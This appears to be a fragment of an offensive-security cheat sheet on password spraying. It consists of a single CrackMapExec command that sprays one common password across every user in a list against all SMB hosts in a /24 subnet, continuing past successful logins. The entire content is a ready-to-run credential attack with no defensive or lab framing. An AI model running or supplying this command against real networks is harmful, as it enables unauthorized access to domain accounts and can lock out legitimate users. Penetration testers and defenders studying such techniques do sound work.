# Password Spraying

## Domain password spray

```bash
# CrackMapExec spray across the domain
cme smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success
```
